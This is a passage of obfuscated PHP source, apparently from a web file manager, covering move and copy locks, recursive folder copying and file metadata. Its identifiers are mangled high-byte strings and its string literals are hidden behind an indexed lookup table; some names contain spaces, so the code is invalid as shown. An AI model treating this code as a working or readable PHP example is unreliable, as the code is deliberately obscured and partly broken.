$c÷¨Ó— ¬); $this->_lockEvent($FÅ“®›‡Ù, array($eËØÅÕÑÚ§[495], $eËØÅÕÑÚ§[497]), $c÷¨Ó— ¬); $this->_lockParent($FÅ“®›‡Ù, array($eËØÅÕÑÚ§[495], $eËØÅÕÑÚ§[497]), $c÷¨Ó— ¬); } public function lockMoveStart($CŠ¢Ù©ø¥) { goto fŞ„ªÜ×ùÜ; cª‡‡¤Ù®ó: $C ä¦§—İŒ = 1; $this->_lockKey($a ”‰ÆÔåê[501] . $CŠ¢Ù©ø¥, $C ä¦§—İŒ); $this->_lockEvent($CŠ¢Ù©ø¥, array($a ”‰ÆÔåê[495], $a ”‰ÆÔåê[496]), $C ä¦§—İŒ); goto a‘„—ˆ¨È; fŞ„ªÜ×ùÜ: $a ”‰ÆÔåê =& $_SERVER[…Ò×–]; if (!$this->allowLock()) { return; } $this->_lockCheck($a ”‰ÆÔåê[497], $CŠ¢Ù©ø¥); goto cª‡‡¤Ù®ó; a‘„—ˆ¨È: $this->_lockParent($CŠ¢Ù©ø¥, array($a ”‰ÆÔåê[495], $a ”‰ÆÔåê[497]), $C ä¦§—İŒ); $this->_lockEvent($CŠ¢Ù©ø¥, array($a ”‰ÆÔåê[502], $a ”‰ÆÔåê[498], $a ”‰ÆÔåê[499]), $C ä¦§—İŒ); $this->_lockCheckEnd($a ”‰ÆÔåê[497], $CŠ¢Ù©ø¥); goto Bà–Ùà—ä; Bà–Ùà—ä: } public function lockMoveEnd($c²ŠÍ¥Âğ÷) { goto A™¾‰šé¦; Dé¢‘ùç‰±: $this->_lockKey($eÒÑùÁœ×£[501] . $c²ŠÍ¥Âğ÷, $cº÷½İ¯½); $this->_lockEvent($c²ŠÍ¥Âğ÷, array($eÒÑùÁœ×£[495], $eÒÑùÁœ×£[496]), $cº÷½İ¯½); $this->_lockParent($c²ŠÍ¥Âğ÷, array($eÒÑùÁœ×£[495], $eÒÑùÁœ×£[497]), $cº÷½İ¯½); goto båˆÔøõË«; A™¾‰šé¦: $eÒÑùÁœ×£ =& $_SERVER[…Ò×–]; if (!$this->allowLock()) { return; } $cº÷½İ¯½ = 0; goto Dé¢‘ùç‰±; båˆÔøõË«: $this->_lockEvent($c²ŠÍ¥Âğ÷, array($eÒÑùÁœ×£[502], $eÒÑùÁœ×£[498], $eÒÑùÁœ×£[499]), $cº÷½İ¯½); goto fÕ„ó”Õ; fÕ„ó”Õ: } private function _lockCheck($fÆÑÇŒÃ¿ó, $f‘Ç´ôºõÄ) { goto cÍŠãÅÏâÛ; cÍŠãÅÏâÛ: $aÙ´ÔØ§äÉ =& $_SERVER[…Ò×–]; $CÈŞŠ’³Öö = $this->sourceInfo($f‘Ç´ôºõÄ); $a¥‰ªÏ‘ª‚ = $fÆÑÇŒÃ¿ó . $aÙ´ÔØ§äÉ[91] . $f‘Ç´ôºõÄ; goto bñ†õÀ÷Ç£; BËÊÖÁŒ½ø: CacheLock::setErrorMsg($aÙ´ÔØ§äÉ[157] . htmlspecialchars($CÈŞŠ’³Öö[$aÙ´ÔØ§äÉ[28]]) . $aÙ´ÔØ§äÉ[481] . $aÈ·«†…¹­); $this->_lockKey($a¥‰ªÏ‘ª‚, 1); $this->_lockKey($a¥‰ªÏ‘ª‚, 0); goto D´Â‹æ³‚¬; bñ†õÀ÷Ç£: $this->_lockTimeStart[$a¥‰ªÏ‘ª‚] = timeFloat(); if (!is_array($CÈŞŠ’³Öö)) { return; } $aÈ·«†…¹­ = LNG($aÙ´ÔØ§äÉ[503]); goto BËÊÖÁŒ½ø; D´Â‹æ³‚¬: $CéùÜåßÉ = array_reverse($this->parentLevelArray($CÈŞŠ’³Öö[$aÙ´ÔØ§äÉ[464]])); foreach ($CéùÜåßÉ as $Eäà­œÇË…) { $a¥‰ªÏ‘ª‚ = $fÆÑÇŒÃ¿ó . $aÙ´ÔØ§äÉ[504] . $Eäà­œÇË…; if (CacheLock::lockGet($aÙ´ÔØ§äÉ[505] . $a¥‰ªÏ‘ª‚)) { $CÈŞŠ’³Öö = $this->sourceInfo($Eäà­œÇË…); CacheLock::setErrorMsg($aÙ´ÔØ§äÉ[157] . htmlspecialchars($CÈŞŠ’³Öö[$aÙ´ÔØ§äÉ[28]]) . $aÙ´ÔØ§äÉ[481] . $aÈ·«†…¹­); $this->_lockKey($a¥‰ªÏ‘ª‚, 1); $this->_lockKey($a¥‰ªÏ‘ª‚, 0); } } goto bÅŒ´‘µÖ¡; bÅŒ´‘µÖ¡: } private function _lockCheckEnd($c‘Êâ‰¡, $D¿¦çš·åÉ) { goto f²ãôè•¦; bÎóÆÚ—Ü: if ($F»°Ñ¥÷ª > 0.5) { unset(self::$cacheSourceInfo[$fæ½ĞƒÜ°©[414] . $D¿¦çš·åÉ]); } $BÈÂÒŒù‰É = $this->sourceInfo($D¿¦çš·åÉ); if (!$BÈÂÒŒù‰É) { show_json(LNG($fæ½ĞƒÜ°©[101]), !1); } goto BÂ¿Ëò¾”š; eÙ²Û‰÷ñÂ: if (!isset($this->_lockTimeStart[$aÚ¢º°‘Ò™])) { return; } $F»°Ñ¥÷ª = timeFloat() - $this->_lockTimeStart[$aÚ¢º°‘Ò™]; unset($this->_lockTimeStart[$aÚ¢º°‘Ò™]); goto bÎóÆÚ—Ü; f²ãôè•¦: $fæ½ĞƒÜ°© =& $_SERVER[…Ò×–]; $aÚ¢º°‘Ò™ = $c‘Êâ‰¡ . $fæ½ĞƒÜ°©[91] . $D¿¦çš·åÉ; CacheLock::setErrorMsg($fæ½ĞƒÜ°©[365]); goto eÙ²Û‰÷ñÂ; BÂ¿Ëò¾”š: } private function _lockParent($a¦‘½·ÃÌ„, $b«ÉŞ–ƒ°¬, $bğÛ‚•´–á) { if (!$this->autoLockSet) { return; } $d•ó»ŠÖÌ° = $this->sourceInfo($a¦‘½·ÃÌ„); if (!is_array($d•ó»ŠÖÌ°)) { return; } $bºˆÔò°™ò = array_reverse($this->parentLevelArray($d•ó»ŠÖÌ°[$_SERVER[…Ò×–][464]])); foreach ($bºˆÔò°™ò as $cöóƒÑ“ğá) { $this->_lockEvent($cöóƒÑ“ğá, $b«ÉŞ–ƒ°¬, $bğÛ‚•´–á); } } private function _lockEvent($Dã®˜¨ËĞğ, $EáŠÎÙêŸ, $A×”ã¬‚Õ) { $cŞÕÚˆ§Œ =& $_SERVER[…Ò×–]; if (!$this->autoLockSet) { return; } foreach ($EáŠÎÙêŸ as $fŠ˜†°»±) { $AÉâ¨å´ñ® = $fŠ˜†°»± . $cŞÕÚˆ§Œ[91] . $Dã®˜¨ËĞğ; if ($A×”ã¬‚Õ && CacheLock::lockGet($cŞÕÚˆ§Œ[505] . $AÉâ¨å´ñ®)) { continue; } $this->_lockKey($AÉâ¨å´ñ®, $A×”ã¬‚Õ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($c²¢‹£¤ª , $f©ò…¯Ëî½ = 1) { $C×ƒÅ†ˆ”ø = $_SERVER[…Ò×–][505] . md5($c²¢‹£¤ª ); if ($f©ò…¯Ëî½) { if (isset(self::$_lockItemArr[$C×ƒÅ†ˆ”ø])) { return; } self::$_lockItemArr[$C×ƒÅ†ˆ”ø] = 1; CacheLock::lock($C×ƒÅ†ˆ”ø, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$C×ƒÅ†ˆ”ø])) { return; } unset(self::$_lockItemArr[$C×ƒÅ†ˆ”ø]); CacheLock::unlock($C×ƒÅ†ˆ”ø); } } public function isParentOf($bÈ¯ø‚×÷î, $Aã™šï¤Ñî) { goto aÇ¿ëÓê¾…; dÚÍèº—´î: $fĞ‚Ÿ£í = $eÜÛö¡Ñà«[$cˆ¾ºÉ™îˆ[464]] . $eÜÛö¡Ñà«[$cˆ¾ºÉ™îˆ[373]] . $cˆ¾ºÉ™îˆ[47]; $a™‚¯ÏÑ = $cÙÚ¯ñˆ¼˜[$cˆ¾ºÉ™îˆ[464]] . $cÙÚ¯ñˆ¼˜[$cˆ¾ºÉ™îˆ[373]] . $cˆ¾ºÉ™îˆ[47]; $cÒ´‹ùØÅ = strpos($a™‚¯ÏÑ, $fĞ‚Ÿ£í) === 0; goto eåÎˆ±‘˜Ø; eåÎˆ±‘˜Ø: return $cÒ´‹ùØÅ; goto aİ»Î—ù†; aÇ¿ëÓê¾…: $cˆ¾ºÉ™îˆ =& $_SERVER[…Ò×–]; $eÜÛö¡Ñà« = $this->sourceInfo($bÈ¯ø‚×÷î); $cÙÚ¯ñˆ¼˜ = $this->sourceInfo($Aã™šï¤Ñî); goto dÚÍèº—´î; aİ»Î—ù†: } private $targetIsDelete = 0; public function copy($DÃìêõğé, $DçÔ…¾£, $aŠ¸¯Ú…ƒ· = REPEAT_REPLACE, $B„ó‚ª º« = '') { goto C’«‘êó±»; B×ë¿¡šéà: $this->_childrenListClear(); $this->lockCopyEnd($DÃìêõğé); $this->lockWriteEnd($DçÔ…¾£, $bá“¼¾‹Âš); goto CŠ“¾ÜÃ; CŠ“¾ÜÃ: if ($bã’÷‡¨[$C‰ğ­…£ôÄ[374]] == $C‰ğ­…£ôÄ[83] && $Dâ¯ÎŞçç¥ == $a®òğå®ìÑ) { $this->folderSizeResetChildren($Dâ¯ÎŞçç¥); } Model($C‰ğ­…£ôÄ[509])->addAll($d³Æâ½ç“¸[$C‰ğ­…£ôÄ[507]], array(), !0); if ($Dâ¯ÎŞçç¥ != $a®òğå®ìÑ || $bã’÷‡¨[$C‰ğ­…£ôÄ[374]] == $C‰ğ­…£ôÄ[83]) { Model($C‰ğ­…£ôÄ[510])->eventCopy($a®òğå®ìÑ); } goto B¾è¤ÒÜª—; C’«‘êó±»: $C‰ğ­…£ôÄ =& $_SERVER[…Ò×–]; $bã’÷‡¨ = $this->sourceInfo($DÃìêõğé); $Cçñ»Ñ°¤š = $this->sourceInfo($DçÔ…¾£); goto e®‘ÂÆÕäÉ; F×ÊØ¼Áò: $this->lockCopyStart($DÃìêõğé); $this->lockWriteStart($DçÔ…¾£, $bá“¼¾‹Âš); $d³Æâ½ç“¸ = array($C‰ğ­…£ôÄ[506] => array(), $C‰ğ­…£ôÄ[507] => array(), $C‰ğ­…£ôÄ[508] => array()); goto AŠ™åãºÆ¾; e®‘ÂÆÕäÉ: if (!$bã’÷‡¨ || !$Cçñ»Ñ°¤š || $Cçñ»Ñ°¤š[$C‰ğ­…£ôÄ[374]] != $C‰ğ­…£ôÄ[83]) { return !1; } if ($this->isParentOf($DÃìêõğé, $DçÔ…¾£)) { return !1; } $bá“¼¾‹Âš = $B„ó‚ª º« ? $B„ó‚ª º« : $bã’÷‡¨[$C‰ğ­…£ôÄ[28]]; goto F×ÊØ¼Áò; B¾è¤ÒÜª—: $this->saveAll($d³Æâ½ç“¸[$C‰ğ­…£ôÄ[508]]); Model($C‰ğ­…£ôÄ[171])->linkAdd($d³Æâ½ç“¸[$C‰ğ­…£ôÄ[506]]); $this->folderSizeReset($DçÔ…¾£); goto bËŸâ„ïÏÕ; AŠ™åãºÆ¾: $this->targetIsDelete = intval($bã’÷‡¨[$C‰ğ­…£ôÄ[401]]); $Dâ¯ÎŞçç¥ = $this->fileNameExistCache($DçÔ…¾£, $bã’÷‡¨[$C‰ğ­…£ôÄ[28]]); $a®òğå®ìÑ = $this->_copy($DÃìêõğé, $DçÔ…¾£, $aŠ¸¯Ú…ƒ·, $d³Æâ½ç“¸, !0, $B„ó‚ª º«); goto B×ë¿¡šéà; bËŸâ„ïÏÕ: $this->updateModifyTime($DçÔ…¾£); return $a®òğå®ìÑ; goto AÖ¬­àÜ»; AÖ¬­àÜ»: } private function _copy($dÌ½ÉäÄÎç, $fÉÉïŠ‘‹è, $C“íÑ„…†ª, &$Aâ±îîÏŸ, $F¤ôÏììªÁ, $DÁ›Ù‘†ŒÖ = '') { goto Fîâğá§ƒ¥; Fîâğá§ƒ¥: $BÚÔòö´âÜ =& $_SERVER[…Ò×–]; $eÂ—ñ÷Œİ¾ = $this->sourceInfoCache($dÌ½ÉäÄÎç); $f±½Ïöøù = $eÂ—ñ÷Œİ¾[$BÚÔòö´âÜ[374]] == $BÚÔòö´âÜ[83]; goto Cíİ¦Å¾æ; F«ÚÍÓ×é„: if (!$aù¹°¯Û¦˜) { return $this->_copyCreate($dÌ½ÉäÄÎç, $fÉÉïŠ‘‹è, $bˆâ·Í‡„®, $Aâ±îîÏŸ); } $A¶É†±‹·× = $aù¹°¯Û¦˜; if ($f±½Ïöøù) { if ($C“íÑ„…†ª == REPEAT_RENAME_FOLDER) { $bˆâ·Í‡„® = $this->fileNameAutoCache($fÉÉïŠ‘‹è, $bˆâ·Í‡„®, $C“íÑ„…†ª, $f±½Ïöøù); $A¶É†±‹·× = $this->_copyCreate($dÌ½ÉäÄÎç, $fÉÉïŠ‘‹è, $bˆâ·Í‡„®, $Aâ±îîÏŸ); } else { $Bèñ›Àâêë = $this->_childrenList($dÌ½ÉäÄÎç); foreach ($Bèñ›Àâêë as $aÅŞ–’ã²) { $this->_copy($aÅŞ–’ã²[$BÚÔòö´âÜ[373]], $aù¹°¯Û¦˜, $C“íÑ„…†ª, $Aâ±îîÏŸ, !1); } } } else { if ($C“íÑ„…†ª == REPEAT_RENAME || $C“íÑ„…†ª == REPEAT_RENAME_FOLDER) { $bˆâ·Í‡„® = $this->fileNameAutoCache($fÉÉïŠ‘‹è, $bˆâ·Í‡„®, $C“íÑ„…†ª, $f±½Ïöøù); $A¶É†±‹·× = $this->_copyCreate($dÌ½ÉäÄÎç, $fÉÉïŠ‘‹è, $bˆâ·Í‡„®, $Aâ±îîÏŸ); } else { if ($C“íÑ„…†ª == REPEAT_REPLACE) { $F¥ê‚ÇÄ· = $this->sourceInfoCache($aù¹°¯Û¦˜); $c¾à©ÔºÌ´ = $this->fileHistory($F¥ê‚ÇÄ·, $eÂ—ñ÷Œİ¾[$BÚÔòö´âÜ[423]], $eÂ—ñ÷Œİ¾[$BÚÔòö´âÜ[77]]); if ($c¾à©ÔºÌ´) { $Aâ±îîÏŸ[$BÚÔòö´âÜ[506]][] = $eÂ—ñ÷Œİ¾[$BÚÔòö´âÜ[423]]; } } else { if ($C“íÑ„…†ª == REPEAT_SKIP) { } } } Hook::trigger($BÚÔòö´âÜ[511], array($BÚÔòö´âÜ[512], $eÂ—ñ÷Œİ¾, 0)); } goto dôô Ä´›; Cíİ¦Å¾æ: $bˆâ·Í‡„® = $DÁ›Ù‘†ŒÖ ? $DÁ›Ù‘†ŒÖ : $eÂ—ñ÷Œİ¾[$BÚÔòö´âÜ[28]]; $aù¹°¯Û¦˜ = $this->fileNameExistCache($fÉÉïŠ‘‹è, $bˆâ·Í‡„®); if ($F¤ôÏììªÁ) { $this->_childrenAllMake($dÌ½ÉäÄÎç); if ($f±½Ïöøù && $aù¹°¯Û¦˜) { $this->_childrenAllMake($aù¹°¯Û¦˜); } } goto F«ÚÍÓ×é„; dôô Ä´›: return $A¶É†±‹·×; goto C§ºá‡Üè†; C§ºá‡Üè†: } private function _copyCreate($Añß¶ÃÃß©, $C†¹ÎšÑÒ±, $C¤¹½ˆÌ, &$Fº–—Î²†) { goto eÇÁËáÓø±; E±áĞÙŒãù: $bèÊ÷‰ã‘ = $this->add($aƒ¡ÃÁ÷¶Ğ); $CŸ×ğò¯¸Í = array($bÍô”´È½—[373] => $bèÊ÷‰ã‘, $bÍô”´È½—[28] => $C¤¹½ˆÌ); $this->_copyApplyMeta($CŸ×ğò¯¸Í, $Fº–—Î²†); goto c¡Ûâç°Ş¬; eÇÁËáÓø±: $bÍô”´È½— =& $_SERVER[…Ò×–]; $dŒËÎãâ²– = $this->sourceInfoCache($Añß¶ÃÃß©); $bĞÃÂµ“° = $this->sourceInfoCache($C†¹ÎšÑÒ±); goto EåÕ¼õ‰±; C…§æá’í‹: $döÈŞ¯åï[$Añß¶ÃÃß©] = $bèÊ÷‰ã‘; $E§Êò©½çã = array(); $Fèô¤ «â¿ = array(); goto døñ†­±¤¦; døñ†­±¤¦: foreach ($C˜Å¦®®»Ä as $aŒ÷İ¢Å’ƒ) { $aÆß‡¬†‹æ = $aŒ÷İ¢Å’ƒ[$bÍô”´È½—[373]]; $Fèê£Åöë¶ = $this->_childrenMatch($döÈŞ¯åï, $aŒ÷İ¢Å’ƒ, $EÀ–¶Òî‘); $E§Êò©½çã[] = array($bÍô”´È½—[373], $aÆß‡¬†‹æ, $bÍô”´È½—[466], $Fèê£Åöë¶[$bÍô”´È½—[466]]); $Fèô¤ «â¿[] = array($bÍô”´È½—[373], $aÆß‡¬†‹æ, $bÍô”´È½—[464], $Fèê£Åöë¶[$bÍô”´È½—[464]]); $this->_copyApplyMeta($aŒ÷İ¢Å’ƒ, $Fº–—Î²†); if ($aŒ÷İ¢Å’ƒ[$bÍô”´È½—[374]] != $bÍô”´È½—[83]) { $Fº–—Î²†[$bÍô”´È½—[506]][] = $aŒ÷İ¢Å’ƒ[$bÍô”´È½—[423]]; } } $this->chunkEventSet($bÍô”´È½—[518], array($bÍô”´È½—[519], $aƒ¡ÃÁ÷¶Ğ, $F™¦·ù¤)); $this->saveAll($E§Êò©½çã); goto cÊìËÍ¬÷Â; c®æßğ·Ğ: $EÀ–¶Òî‘ = $this->sourceInfo($bèÊ÷‰ã‘); foreach ($F‡«Á¡Âğ× as $aŒ÷İ¢Å’ƒ) { $F†ãæÍ¦è = $this->_makeItemData($aŒ÷İ¢Å’ƒ, $EÀ–¶Òî‘, $aŒ÷İ¢Å’ƒ[$bÍô”´È½—[28]]); $F†ãæÍ¦è[$bÍô”´È½—[464]] = $aŒ÷İ¢Å’ƒ[$bÍô”´È½—[464]]; $fÙÜ¢†›Åè[] = $F†ãæÍ¦è; } $this->chunkEventSet($bÍô”´È½—[516], array($bÍô”´È½—[517], $aƒ¡ÃÁ÷¶Ğ, $F™¦·ù¤)); goto c®Ëùà˜²; EåÕ¼õ‰±: $aƒ¡ÃÁ÷¶Ğ = $this->_makeItemData($dŒËÎãâ²–, $bĞÃÂµ“°, $C¤¹½ˆÌ); Hook::trigger($bÍô”´È½—[513], $aƒ¡ÃÁ÷¶Ğ); Hook::trigger($bÍô”´È½—[514], array($bÍô”´È½—[515], $aƒ¡ÃÁ÷¶Ğ, 0)); goto E±áĞÙŒãù; cÊìËÍ¬÷Â: $this->chunkEventSet($bÍô”´È½—[520], array($bÍô”´È½—[521], $aƒ¡ÃÁ÷¶Ğ, $F™¦·ù¤)); $this->saveAll($Fèô¤ «â¿); return $bèÊ÷‰ã‘; goto b™ôæ˜öª; c®Ëùà˜²: $this->addAll($fÙÜ¢†›Åè, array(), !1); $C˜Å¦®®»Ä = $this->where(array($bÍô”´È½—[466] => $bèÊ÷‰ã‘))->select(); $döÈŞ¯åï = $this->_childrenMakeRelation($F‡«Á¡Âğ×, $C˜Å¦®®»Ä); goto C…§æá’í‹; c¡Ûâç°Ş¬: if ($dŒËÎãâ²–[$bÍô”´È½—[374]] != $bÍô”´È½—[83]) { $Fº–—Î²†[$bÍô”´È½—[506]][] = $dŒËÎãâ²–[$bÍô”´È½—[423]]; return $bèÊ÷‰ã‘; } $F‡«Á¡Âğ× = array(); $fÙÜ¢†›Åè = array(); goto b©“ì®Ÿƒå; b©“ì®Ÿƒå: $this->_childrenListAll($Añß¶ÃÃß©, $F‡«Á¡Âğ×); $F™¦·ù¤ = count($F‡«Á¡Âğ×); if ($F™¦·ù¤ == 0) { return $bèÊ÷‰ã‘; } goto c®æßğ·Ğ; b™ôæ˜öª: } private function _childrenMakeRelation($C¸‰»¯‘ë÷, $bõÊÇ²›¦Ø) { $cÍ‹÷ã†Šù =& $_SERVER[…Ò×–]; $FÔ¿®¶ËÆƒ = array(); $cÃœ±œ‰‰” = array(); foreach ($C¸‰»¯‘ë÷ as $F­ŒìŸé) { $BÊñÂã¯ëÂ = $F­ŒìŸé[$cÍ‹÷ã†Šù[28]] . $cÍ‹÷ã†Šù[8] . $F­ŒìŸé[$cÍ‹÷ã†Šù[464]]; $FÔ¿®¶ËÆƒ[$BÊñÂã¯ëÂ] = $F­ŒìŸé[$cÍ‹÷ã†Šù[373]]; } foreach ($bõÊÇ²›¦Ø as $F­ŒìŸé) { $BÊñÂã¯ëÂ = $F­ŒìŸé[$cÍ‹÷ã†Šù[28]] . $cÍ‹÷ã†Šù[8] . $F­ŒìŸé[$cÍ‹÷ã†Šù[464]]; $CÒÌ–í­á = $FÔ¿®¶ËÆƒ[$BÊñÂã¯ëÂ]; $cÃœ±œ‰‰”[$CÒÌ–í­á] = $F­ŒìŸé[$cÍ‹÷ã†Šù[373]]; } return $cÃœ±œ‰‰”; } private function _childrenMatch($C‡ÓïâÅÍ, $cŠœÉ©Ûëé, $cëà—ÚŠê‚) { goto b–‚©ÍÓá¾; b–‚©ÍÓá¾: $eØø™İ‘×Ï =& $_SERVER[…Ò×–]; $d×Õ˜ö¹˜ = $cëà—ÚŠê‚[$eØø™İ‘×Ï[464]]; $f‘Œ³ÉÃï¸ = $this->parentLevelArray($cŠœÉ©Ûëé[$eØø™İ‘×Ï[464]]); goto Eß…¢„Åê; C­ô¡Î‚Àã: $eš¦Š™âô = $E’Ç°ùˆ…•[count($E’Ç°ùˆ…•) - 1]; return array($eØø™İ‘×Ï[466] => $eš¦Š™âô, $eØø™İ‘×Ï[464] => $d×Õ˜ö¹˜); goto E·ãÀÖ…§³; Eß…¢„Åê: foreach ($f‘Œ³ÉÃï¸ as $a®ß¼à¥ö¸) { if (isset($C‡ÓïâÅÍ[$a®ß¼à¥ö¸])) { $d×Õ˜ö¹˜ .= $C‡ÓïâÅÍ[$a®ß¼à¥ö¸] . $eØø™İ‘×Ï[522]; } } $d×Õ˜ö¹˜ = rtrim($d×Õ˜ö¹˜, $eØø™İ‘×Ï[47]) . $eØø™İ‘×Ï[47]; $E’Ç°ùˆ…• = $this->parentLevelArray($d×Õ˜ö¹˜); goto C­ô¡Î‚Àã; E·ãÀÖ…§³: } private function _makeItemData($cÌÀ‚„À¯•, $c£×Ñ†ø‘, $f„ÉØö±¶š) { $bè¤ÈÌ‡ùÒ =& $_SERVER[…Ò×–]; $EêĞ´’äŞ½ = array($bè¤ÈÌ‡ùÒ[523] => $cÌÀ‚„À¯•[$bè¤ÈÌ‡ùÒ[374]], $bè¤ÈÌ‡ùÒ[390] => $f„ÉØö±¶š, $bè¤ÈÌ‡ùÒ[524] => $cÌÀ‚„À¯•[$bè¤ÈÌ‡ùÒ[376]], $bè¤ÈÌ‡ùÒ[424] => $cÌÀ‚„À¯•[$bè¤ÈÌ‡ùÒ[423]], $bè¤ÈÌ‡ùÒ[525] => $cÌÀ‚„À¯•[$bè¤ÈÌ‡ùÒ[77]], $bè¤ÈÌ‡ùÒ[526] => $c£×Ñ†ø‘[$bè¤ÈÌ‡ùÒ[375]], $bè¤ÈÌ‡ùÒ[527] => $c£×Ñ†ø‘[$bè¤ÈÌ‡ùÒ[461]], $bè¤ÈÌ‡ùÒ[528] => USER_ID, $bè¤ÈÌ‡ùÒ[529] => USER_ID, $bè¤ÈÌ‡ùÒ[372] => $c£×Ñ†ø‘[$bè¤ÈÌ‡ùÒ[373]], $bè¤ÈÌ‡ùÒ[530] => $c£×Ñ†ø‘[$bè¤ÈÌ‡ùÒ[464]] . $c£×Ñ†ø‘[$bè¤ÈÌ‡ùÒ[373]] . $bè¤ÈÌ‡ùÒ[47], $bè¤ÈÌ‡ùÒ[400] => 0, $bè¤ÈÌ‡ùÒ[531] => $bè¤ÈÌ‡ùÒ[33]); return $EêĞ´’äŞ½; } private function _copyApplyMeta($C­Ò™ˆ÷Ñ¬, &$e×²Öğ¸°›) { $F²ØŸŒ›¢Ğ =& $_SERVER[…Ò×–]; $eµÌùÉô·É = $C­Ò™ˆ÷Ñ¬[$F²ØŸŒ›¢Ğ[373]]; $eÙ·ª±‡î = $C­Ò™ˆ÷Ñ¬[$F²ØŸŒ›¢Ğ[28]]; if (!isset($C­Ò™ˆ÷Ñ¬[$F²ØŸŒ›¢Ğ[532]]) || !$C­Ò™ˆ÷Ñ¬[$F²ØŸŒ›¢Ğ[532]] || $C­Ò™ˆ÷Ñ¬[$F²ØŸŒ›¢Ğ[532]] == $F²ØŸŒ›¢Ğ[473]) { $e×²Öğ¸°›[$F²ØŸŒ›¢Ğ[508]][] = array($F²ØŸŒ›¢Ğ[373], $eµÌùÉô·É, $F²ØŸŒ›¢Ğ[532], short_id($eµÌùÉô·É)); } if (Input::check($eÙ·ª±‡î, $F²ØŸŒ›¢Ğ[533])) { $e×²Öğ¸°›[$F²ØŸŒ›¢Ğ[507]][] = array($F²ØŸŒ›¢Ğ[373] => $eµÌùÉô·É, $F²ØŸŒ›¢Ğ[89] => $F²ØŸŒ›¢Ğ[420], $F²ØŸŒ›¢Ğ[363] => str_replace($F²ØŸŒ›¢Ğ[50], $F²ØŸŒ›¢Ğ[33], Pinyin::encode($eÙ·ª±‡î))); $e×²Öğ¸°›[$F²ØŸŒ›¢Ğ[507]][] = array($F²ØŸŒ›¢Ğ[373] => $eµÌùÉô·É, $F²ØŸŒ›¢Ğ[89] => $F²ØŸŒ›¢Ğ[419], $F²ØŸŒ›¢Ğ[363] => Pinyin::encode($eÙ·ª±‡î, $F²ØŸŒ›¢Ğ[534])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($FçØò…ÊØî) { goto dŠ„¤®ÎÃ; fÁùƒ†¥ôÊ: $Eˆ¤Åº¥ß³ = array_to_keyvalue($Eˆ¤Åº¥ß³, $BÄòôÌÀ–Ë[373]); foreach ($Eˆ¤Åº¥ß³ as $A…¥¿ß¤´) { $bÏ¡² • = $A…¥¿ß¤´[$BÄòôÌÀ–Ë[466]]; $FçØò…ÊØî = $A…¥¿ß¤´[$BÄòôÌÀ–Ë[373]]; if (!isset($this->_childrenListCache[$FçØò…ÊØî]) && $A…¥¿ß¤´[$BÄòôÌÀ–Ë[374]] == $BÄòôÌÀ–Ë[83]) { $this->_childrenListCache[$FçØò…ÊØî] = array(); } if (!isset($this->_childrenListCache[$bÏ¡² •])) { $this->_childrenListCache[$bÏ¡² •] = array(); } $this->_childrenListCache[$bÏ¡² •][$FçØò…ÊØî] = $A…¥¿ß¤´; $this->_childrenItemCache[$FçØò…ÊØî] = $A…¥¿ß¤´; } goto fàùïÍÀñÈ; dŠ„¤®ÎÃ: $BÄòôÌÀ–Ë =& $_SERVER[…Ò×–]; $A¹ÛµÍ†Â = $this->sourceInfo($FçØò…ÊØî); $Bá˜ô¦à˜‘ = $BÄòôÌÀ–Ë[402]; goto Eè—‹íá¹Ë; Eè—‹íá¹Ë: $CÌ‡Ä‘ò¹Å = array($BÄòôÌÀ–Ë[464] => array($BÄòôÌÀ–Ë[488], $A¹ÛµÍ†Â[$BÄòôÌÀ–Ë[464]] . $FçØò…ÊØî . $BÄòôÌÀ–Ë[489]), $BÄòôÌÀ–Ë[401] => $this->targetIsDelete); $Eˆ¤Åº¥ß³ = $this->field($Bá˜ô¦à˜‘)->where($CÌ‡Ä‘ò¹Å)->select(); if (!$Eˆ¤Åº¥ß³) { return; } goto fÁùƒ†¥ôÊ; fàùïÍÀñÈ: } private function _childrenListAll($Eë¬©¯°¶’, &$fƒ„µ„µé¡) { $fÓ¾ÆÍ×ÒÃ =& $_SERVER[…Ò×–]; if (!isset($this->_childrenListCache[$Eë¬©¯°¶’])) { return; } $Aìëíîç = $this->_childrenListCache[$Eë¬©¯°¶’]; foreach ($Aìëíîç as $e§áˆ‰§¥ƒ => $Dç‘……¿ÀÛ) { $fƒ„µ„µé¡[$e§áˆ‰§¥ƒ] = $Dç‘……¿ÀÛ; if ($Dç‘……¿ÀÛ[$fÓ¾ÆÍ×ÒÃ[374]] == $fÓ¾ÆÍ×ÒÃ[83]) { $this->_childrenListAll($e§áˆ‰§¥ƒ, $fƒ„µ„µé¡); } } } private function sourceInfoCache($d ¡”èââ) { if (isset($this->_childrenItemCache[$d ¡”èââ])) { return $this->_childrenItemCache[$d ¡”èââ]; } return $this->sourceInfo($d ¡”èââ); } private function _childrenList($DĞîè·ÆØë) { if (isset($this->_childrenListCache[$DĞîè·ÆØë])) { return $this->_childrenListCache[$DĞîè·ÆØë]; } return $this->_childrenListSelect($DĞîè·ÆØë); } private function _childrenListSelect($Cˆ¸ˆîÂ¨) { goto fê†Ã©…­´; C§¤ï‚“–: foreach ($aƒ©¨Ç†‘Ë as $Cˆ¸ˆîÂ¨ => $B²–òÌÄâñ) { $this->_childrenItemCache[$Cˆ¸ˆîÂ¨] = $B²–òÌÄâñ; } return $aƒ©¨Ç†‘Ë; goto A±êÉëˆ„Ê; cÆÍŒÓ¹¿: $eˆÜå†·à = $eˆÜå†·à ? $eˆÜå†·à : array(); $aƒ©¨Ç†‘Ë = array_to_keyvalue($eˆÜå†·à, $CÚ°Í„É‘Œ[373]); $this->_childrenListCache[$Cˆ¸ˆîÂ¨] = $aƒ©¨Ç†‘Ë; goto C§¤ï‚“–; fê†Ã©…­´: $CÚ°Í„É‘Œ =& $_SERVER[…Ò×–]; $f™Ü‘Œ† = array($CÚ°Í„É‘Œ[466] => $Cˆ¸ˆîÂ¨, $CÚ°Í„É‘Œ[401] => $this->targetIsDelete); $eˆÜå†·à = $this->where($f™Ü‘Œ†)->select(); goto cÆÍŒÓ¹¿; A±êÉëˆ„Ê: } private function fileNameExistCache($E²¸ˆ´§, $cè–‚˜°óˆ) { $cëÌ·ôÕ©Ò =& $_SERVER[…Ò×–]; $cè–‚˜°óˆ = strtolower($cè–‚˜°óˆ); $a¸ÛÌŒ©àŒ = $this->_childrenList($E²¸ˆ´§); foreach ($a¸ÛÌŒ©àŒ as $A±²ŞùÂ†…) { if ($cè–‚˜°óˆ == 